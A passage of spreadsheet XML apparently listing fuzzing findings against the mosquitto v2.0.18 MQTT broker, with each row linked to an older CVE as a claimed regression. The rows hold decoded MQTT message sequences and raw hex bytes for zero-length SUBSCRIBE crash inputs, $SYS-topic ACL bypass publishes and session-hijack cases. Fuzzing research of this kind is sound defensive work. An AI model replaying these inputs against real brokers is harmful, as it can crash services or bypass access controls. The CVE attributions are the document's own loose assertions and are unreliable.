      <c r="D1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将种子文件(id:000007,sev:3,cat:0386)中的REQUEST DATA提取出来(340B)\u000a4.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0x0386\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E148" s="2">
        <f>== 种子标识: id:000007,sev:3,cat:0386 ===\u000a大小: 1988B (报告+请求数据)\u000a请求数据: 340B\u000a\u000a---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MQTT请求序列(340B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='tesTT\x05' QoS=0 retain=True payload='\x06\x00&lt;(\x11\x00' | raw_header=310e000674657354540506003c281100\u000aMsg[2]: TYPE0  | raw_header=000877696c6c5f6d7367\u000aMsg[3]: DISCONNECT 断开连接 | raw_header=e000\u000aMsg[4]: CONNECT Proto=MQTT v4 ClientID=''(0B) clean_session=True keepalive=60s Will=YES WillTopic='will/topic' [自动清理会话] | raw_header=102200044d5154540406003c0000000a\u000aMsg[5]: PUBLISH Topic='?' QoS=0 retain=True payload='' | raw_header=312a180000000001000200000e100300\u000aMsg[6]: TYPE0  | raw_header=000d77696c6c2f76352f746f706963\u000aMsg[7]: TYPE0  | raw_header=000b77696c6c5f76355f6d7367\u000aMsg[8]: SUBSCRIBE PacketID=27 Topics=['$SYS/broker/uptime'(QoS=2)] | raw_header=8217001b0012245359532f62726f6b65\u000aMsg[9]: PUBLISH Topic='$SYS/#' QoS=0 retain=True payload='\x00\x01\x02\x03' | raw_header=310c0006245359532f2300010203\u000aMsg[10]: PUBLISH Topic='sensor/temp/room1' QoS=1 retain=False payload='\x00\x1d' | raw_header=3215001173656e736f722f74656d702f\u000aMsg[11]: PUBLISH Topic='home/+/status' QoS=2 retain=True payload_len=106B | raw_header=3579000d686f6d652f2b2f7374617475\u000aMsg[12]: PINGREQ  | raw_header=c000\u000aMsg[13]: (不完整,17B) raw=e010000e110000001f00066e6f726d616c\u000a(尾部17B): e010000e110000001f00066e6f726d616c</f>
        <v/>
      </c>
      <c r="F1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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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49">
      <c r="A149" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:4,cat:0040</t>
        </is>
      </c>
      <c r="B149" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C149" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(66B)\u000a4.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49" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0040 ===\u000a大小: 472B (报告+请求数据)\u000a请求数据: 66B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev4】MQTT: SUBSCRIBE with zero-length topic filter (broker crash risk) (Cat=0x0040 Hash=0x2b06a199 CVE=CVE-2019-5432)\u000a\u000a--- MQTT请求序列(66B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=25 Topics=[''(零长度!QoS=2)] | raw_header=820c00190000062b2f646174612a\u000aMsg[2]: PUBLISH Topic='$share/grp1/#' QoS=0 retain=False payload='\u000d\x02M©ê\u0009#'ÿ\x0býú\x93$$ê\x101¡ÚR»Ì\x08\x00ô\x99=$%\x18Õ¿H' | raw_header=3031000d2473686172652f677270312f\u000aMsg[3]: SUBACK  | raw_header=91</f>
        <v/>
      </c>
      <c r="F1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49" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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4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50">
      <c r="A150" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:4,cat:0042</t>
        </is>
      </c>
      <c r="B150" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C150" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(259B)\u000a4.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50" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0042 ===\u000a大小: 812B (报告+请求数据)\u000a请求数据: 259B\u000a\u000a---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MQTT请求序列(259B原始二进制) ---\u000aMsg[1]: TYPE0  | raw_header=0a4440ef0c020c9873742f4b00146460\u000aMsg[2]: AUTH  | raw_header=ff00\u000aMsg[3]: SUBSCRIBE PacketID=2886 Topics=[''(零长度!QoS=1)] | raw_header=821f0b46000001740400000400122473\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=116B | raw_header=3c89010013245359532f62726f6b6572\u000aMsg[5]: SUBSCRIBE  | raw_header=8000\u000aMsg[6]: (不完整,12B) raw=fcd71f0006e53f0e33e5fe03\u000a(尾部12B): fcd71f0006e53f0e33e5fe03</f>
        <v/>
      </c>
      <c r="F1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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J15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1">
      <c r="A151" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:4,cat:00c0</t>
        </is>
      </c>
      <c r="B151" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C151" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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51" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c0 ===\u000a大小: 1777B (报告+请求数据)\u000a请求数据: 194B\u000a\u000a---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CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=10ec0010ec00044d5154541e02003c00\u000aMsg[2]: SUBSCRIBE PacketID=31 Topics=[''(零长度!QoS=2)] | raw_header=821d001f00000a746573742f746f7069\u000aMsg[3]: CONNECT Proto=? v0 ClientID=''(0B) clean_session=False keepalive=0s [持久会话] | raw_header=1b1b1b1b1b1b1b1b1b1b1b1b1b1afc1b\u000aMsg[4]: (不完整,23B) raw=1b1b1b1b686172652f676963005bc341f6db005aa20064\u000a(尾部23B): 1b1b1b1b686172652f676963005bc341f6db005aa20064</f>
        <v/>
      </c>
      <c r="F1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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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5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52">
      <c r="A152" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:4,cat:00c2</t>
        </is>
      </c>
      <c r="B152" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C152" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(273B)\u000a4.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152" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:00c2 ===\u000a大小: 1182B (报告+请求数据)\u000a请求数据: 273B\u000a\u000a---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MQTT请求序列(273B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='þ\x05\x0bõ' QoS=2 retain=False payload='\x81år/#\x024\x0e' | raw_header=340e0004fe050bf581e5722f2302340e\u000aMsg[2]: TYPE0  | raw_header=0006746573742f63\u000aMsg[3]: SUBSCRIBE PacketID=257 Topics=[''(零长度!QoS=0)] | raw_header=8226010100001c2473686172652f6733\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=1 retain=True payload_len=93B | raw_header=33720013245359532f62726f6b65722f\u000aMsg[5]: TYPE0  | raw_header=00146461746162020012686f6d652f2b\u000aMsg[6]: (不完整,71B) raw=726174757265110009612f622f637270322f73656e736f722f23010000004d7a4133820b00010006\u000a(尾部71B): 726174757265110009612f622f637270322f73656e736f722f23010000004d7a4133820b00010006746573742f2302340e00</f>
        <v/>
      </c>
      <c r="F1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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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3">
      <c r="A153" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:4,cat:0244</t>
        </is>
      </c>
      <c r="B153" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C153" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(58B)\u000a4.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53" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0244 ===\u000a大小: 887B (报告+请求数据)\u000a请求数据: 58B\u000a\u000a---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MQTT请求序列(58B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=325 Topics=[''(零长度!QoS=2), '$share/grp1/test/+'(QoS=2)] | raw_header=821a014500000200122473686172652f\u000aMsg[2]: PUBLISH Topic='$share/grp/test/topic' QoS=0 retain=False payload='°(\u000dý' | raw_header=301b00152473686172652f6772702f74\u000aMsg[3]: PINGRESP  | raw_header=d2</f>
        <v/>
      </c>
      <c r="F1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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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5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54">
      <c r="A154" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:4,cat:0246</t>
        </is>
      </c>
      <c r="B154" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C154" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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将种子文件(id:000007,sev:4,cat:0246)中的REQUEST DATA提取出来(133B)\u000a4.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154" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:0246 ===\u000a大小: 1128B (报告+请求数据)\u000a请求数据: 133B\u000a\u000a---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MQTT请求序列(133B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=69 Topics=[''(零长度!QoS=3)] | raw_header=8219004500000b73656e736f722f7465\u000aMsg[2]: PUBLISH Topic='$SYS/broker/clients/connected' QoS=1 retain=False payload_len=68B | raw_header=3263001d245359532f62726f6b65722f\u000aMsg[3]: (不完整,5B) raw=2710286a1a\u000a(尾部5B): 2710286a1a</f>
        <v/>
      </c>
      <c r="F1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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J15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5">
      <c r="A155" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:4,cat:02c4</t>
        </is>
      </c>
      <c r="B155" s="2" t="inlineStr">
        <is>
          <t>NULL指针解引用漏洞 - SUBSCRIBE零长度主题过滤器</t>
        </is>
      </c>
      <c r="C155" s="2" t="inlineStr">
        <is>
          <t>CVE-2019-5432 (同类回归: mosquitto v1.5.x/v1.6.x零长度主题过滤器NULL解引用在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(140B)\u000a4.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55" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:02c4 ===\u000a大小: 1158B (报告+请求数据)\u000a请求数据: 140B\u000a\u000a---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MQTT请求序列(140B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=505 Topics=['home/+/temperature'(QoS=1), '$share/grp1/test/+'(QoS=0), ''(零长度!QoS=2)] | raw_header=822f01f90012686f6d652f2b2f74656d\u000aMsg[2]: PUBLISH Topic='very/deep/topic/level1/level2/level3/level4' QoS=2 retain=True payload_len=43B | raw_header=3d58002b766572792f646565702f746f\u000aMsg[3]: DISCONNECT 断开连接 | raw_header=e0</f>
        <v/>
      </c>
      <c r="F1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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(可导致服务器崩溃风险)</t>
        </is>
      </c>
      <c r="J1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5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56">
      <c r="A156" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000007,sev:4,cat:02c6</t>
        </is>
      </c>
      <c r="B156" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C156" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(249B)\u000a4.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56" s="2">
        <f>== 种子标识: id:000007,sev:4,cat:02c6 ===\u000a大小: 1431B (报告+请求数据)\u000a请求数据: 249B\u000a\u000a---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MQTT请求序列(249B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='MQTT' QoS=2 retain=False payload='ÿÿÿ\x7f\x00\x07fuzz_c4' | raw_header=341300044d515454ffffff7f00076675\u000aMsg[2]: PUBLISH Topic='test/retained' QoS=0 retain=True payload='keep_me' | raw_header=3116000d746573742f72657461696e65\u000aMsg[3]: SUBSCRIBE PacketID=2 Topics=['test/retained'(QoS=0)] | raw_header=82120002000d746573742f7265746169\u000aMsg[4]: PUBLISH Topic='test/qos2' QoS=2 retain=False payload='\x00\x03need_pubrel' | raw_header=34180009746573742f716f733200036e\u000aMsg[5]: PUBREC PacketID=3 | raw_header=50020003\u000aMsg[6]: PUBREL PacketID=3 | raw_header=62020003\u000aMsg[7]: PUBCOMP PacketID=3 | raw_header=70020003\u000aMsg[8]: UNSUBSCRIBE  | raw_header=a2110004000d746573742f7265746169\u000aMsg[9]: SUBSCRIBE PacketID=466 Topics=['+/data'(QoS=2), ''(零长度!QoS=0), '$share/grp/test/topic'(QoS=1)] | raw_header=822601d200062b2f6461746102000000\u000aMsg[10]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=False payload_len=62B | raw_header=3c530013245359532f62726f6b65722f\u000aMsg[11]: DISCONNECT 断开连接 | raw_header=e000</f>
        <v/>
      </c>
      <c r="F1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6" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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7">
      <c r="A157" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0002</t>
        </is>
      </c>
      <c r="B157" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C157" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(135B)\u000a4.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57" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0002 ===\u000a大小: 842B (报告+请求数据)\u000a请求数据: 135B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: PUBLISH to $SYS topic (ACL bypass) (Cat=0x0002 Hash=0x06a9cae1 CVE=N/A)\u000a\u000a--- MQTT请求序列(135B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=156 Topics=[] | raw_header=8221009c050beb83e71a0012686f6d65\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=76B | raw_header=30610013245359532f62726f6b65722f\u000aMsg[3]: DISCONNECT 断开连接 | raw_header=e9</f>
        <v/>
      </c>
      <c r="F1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7" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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8">
      <c r="A158" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0082</t>
        </is>
      </c>
      <c r="B158" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C158" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(253B)\u000a4.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58" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0082 ===\u000a大小: 2142B (报告+请求数据)\u000a请求数据: 253B\u000a\u000a---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MQTT请求序列(253B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='test/togic' QoS=0 retain=False payload_len=58B | raw_header=3046000a746573742f746f6769630482\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload_len=153B | raw_header=3dae010013245359532f62726f6b6572\u000aMsg[3]: (不完整,4B) raw=7a5f6331\u000a(尾部4B): 7a5f6331</f>
        <v/>
      </c>
      <c r="F1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8" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J15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5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59">
      <c r="A159" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:00c0</t>
        </is>
      </c>
      <c r="B159" s="2" t="inlineStr">
        <is>
          <t>资源耗尽漏洞 - MQTT v5过量User Properties属性</t>
        </is>
      </c>
      <c r="C159" s="2" t="inlineStr">
        <is>
          <t>CVE-2021-41039 (同类: mosquitto MQTT v5属性解析CPU耗尽)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(1135B)\u000a4.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159" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:00c0 ===\u000a大小: 1538B (报告+请求数据)\u000a请求数据: 1135B\u000a\u000a--- 检测到的协议Oracle违规 ---\u000a【Sev3】MQTT: Excessive v5 user-properties (CPU exhaustion risk) (Cat=0x00c0 Hash=0xa8bb2df4 CVE=CVE-2021-41039)\u000a\u000a--- MQTT请求序列(1135B原始二进制) ---\u000aMsg[1]: (不完整,1135B) raw=d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5\u000a(尾部1135B): d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d5d564d5d9d5d5d5d5d5</f>
        <v/>
      </c>
      <c r="F1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5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59" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(资源耗尽风险)</t>
        </is>
      </c>
      <c r="J15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59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0">
      <c r="A160" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0101</t>
        </is>
      </c>
      <c r="B160" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C160" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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60" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0101 ===\u000a大小: 431B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(不完整,25B) raw=14230000010016230000010006746573742f23003414000974\u000a(尾部25B): 14230000010016230000010006746573742f23003414000974</f>
        <v/>
      </c>
      <c r="F1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0" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J16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6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61">
      <c r="A161" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0103</t>
        </is>
      </c>
      <c r="B161" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C161" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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161" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0103 ===\u000a大小: 867B (报告+请求数据)\u000a请求数据: 194B\u000a\u000a---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MQTT请求序列(194B原始二进制) ---\u000aMsg[1]: (不完整,194B) raw=3e98825400942d26001d245359532f62726f6b65722f636c69656e74732f636f6e6e656374656400\u000a(尾部194B): 3e98825400942d26001d245359532f62726f6b65722f636c69656e74732f636f6e6e6563746564000b73656e736f722f7465</f>
        <v/>
      </c>
      <c r="F1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1" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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6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62">
      <c r="A162" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0181</t>
        </is>
      </c>
      <c r="B162" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C162" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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162" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0181 ===\u000a大小: 796B (报告+请求数据)\u000a请求数据: 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MQTT请求序列(83B原始二进制) ---\u000aMsg[1]: CONNECT  | raw_header=1000\u000aMsg[2]: PUBLISH  | raw_header=3900\u000aMsg[3]: (不完整,79B) raw=00ff007f746573742f72657461696e65646b6565705f6d6582120002000d746573742f7265746127\u000a(尾部79B): 00ff007f746573742f72657461696e65646b6565705f6d6582120002000d746573742f72657461270b0a0072980000000000</f>
        <v/>
      </c>
      <c r="F1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2" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J16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6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63">
      <c r="A163" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0183</t>
        </is>
      </c>
      <c r="B163" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C163" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(223B)\u000a4.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163" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0183 ===\u000a大小: 1083B (报告+请求数据)\u000a请求数据: 223B\u000a\u000a---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MQTT请求序列(223B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=['tesÁÁ\x01'(QoS=3)] | raw_header=810b00010006746573c1c10103\u000aMsg[2]: TYPE0  | raw_header=00144141414141424141414141825204\u000aMsg[3]: CONNACK session_present=97 reason_code=116 | raw_header=2f64617461002b766572792f64656570\u000aMsg[4]: PUBLISH Topic='$SYS/broker/version' QoS=2 retain=True payload='\x00\x0bsensor/tempú\x0eí¦' | raw_header=35260013245359532f62726f6b65722f\u000aMsg[5]: (不完整,46B) raw=7b57b8f5b12ffcc945f17ba7f8768736a74f432517e3cc310454d3fe62c1414141e8ff0000067465\u000a(尾部46B): 7b57b8f5b12ffcc945f17ba7f8768736a74f432517e3cc310454d3fe62c1414141e8ff000006746573c1c1010311</f>
        <v/>
      </c>
      <c r="F1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3" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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6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64">
      <c r="A164" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:01c1</t>
        </is>
      </c>
      <c r="B164" s="2" t="inlineStr">
        <is>
          <t>会话劫持漏洞 - 空ClientID配合clean_session=0</t>
        </is>
      </c>
      <c r="C164" s="2" t="inlineStr">
        <is>
          <t>CVE-2014-6116 (同类: mosquitto v1.3.x会话固定漏洞在v2.0.18持续存在)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(2793B)\u000a4.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164" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:01c1 ===\u000a大小: 3512B (报告+请求数据)\u000a请求数据: 2793B\u000a\u000a---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MQTT请求序列(2793B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=1 Topics=[] | raw_header=820b0001002626262626262603\u000aMsg[2]: CONNACK session_present=38 reason_code=38 | raw_header=2626262626262626260a262626262626\u000aMsg[3]: CONNACK  | raw_header=2600\u000aMsg[4]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[5]: CONNACK session_present=38 reason_code=38 | raw_header=26262626262626262626262626262626\u000aMsg[6]: PUBCOMP PacketID=29633 | raw_header=746573c1c10103001441414141412626\u000aMsg[7]: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raw_header=26262626262626262626262626262626\u000a(尾部1795B): 2626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626262626</f>
        <v/>
      </c>
      <c r="F1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4" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(会话安全属性违规)</t>
        </is>
      </c>
      <c r="J16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6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65">
      <c r="A165" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0206</t>
        </is>
      </c>
      <c r="B165" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C165" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(227B)\u000a4.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65" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0206 ===\u000a大小: 1060B (报告+请求数据)\u000a请求数据: 227B\u000a\u000a---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MQTT请求序列(227B原始二进制) ---\u000aMsg[1]: SUBSCRIBE PacketID=404 Topics=[] | raw_header=825e0194200bedb1d45d260001230015\u000aMsg[2]: PUBLISH Topic='$SYS/broker/version' QoS=0 retain=False payload_len=106B | raw_header=307f0013245359532f62726f6b65722f\u000aMsg[3]: (不完整,2B) raw=3f40\u000a(尾部2B): 3f40</f>
        <v/>
      </c>
      <c r="F1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5" s="2" t="inlineStr">
        <is>
          <t>否 - 逻辑漏洞(协议安全属性违规)</t>
        </is>
      </c>
      <c r="J1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6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66">
      <c r="A166" s="2" t="inlineStr">
        <is>
          <t>out-mosquitto-v2.0.18-chatafl_opt_3.tar.gz/replayable-violations/id:000008,sev:3,cat:0286</t>
        </is>
      </c>
      <c r="B166" s="2" t="inlineStr">
        <is>
          <t>ACL绕过漏洞 - PUBLISH到$SYS系统主题</t>
        </is>
      </c>
      <c r="C166" s="2" t="inlineStr">
        <is>
          <t>CVE-2017-7650 (同类回归: mosquitto v1.4.x/v1.5.x $SYS主题ACL绕过在v2.0.18重新出现)</t>
        </is>
      </c>
      <c r="D1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DATA提取出来(16452B)\u000a4.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0x0286\u000a- Fuzzing验证: 10组独立实验,749个独立种子验证稳定性\u000a- Docker独立复现: 已确认协议安全属性违规</t>
        </is>
      </c>
      <c r="E166" s="2">
        <f>== 种子标识: id:000008,sev:3,cat:0286 ===\u000a大小: 7246B (报告+请求数据)\u000a请求数据: 16452B\u000a\u000a---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MQTT请求序列(16452B原始二进制) ---\u000aMsg[1]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[2]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[3]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[4]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[5]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[6]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[7]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[8]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[9]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[10]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[11]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[12]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[13]: PUBLISH Topic='?' QoS=2 retain=True payload='' | raw_header=35353535353535353535353535353535\u000aMsg[14]: PUBLISH Topic='?' QoS=2 retain=True payload='' | 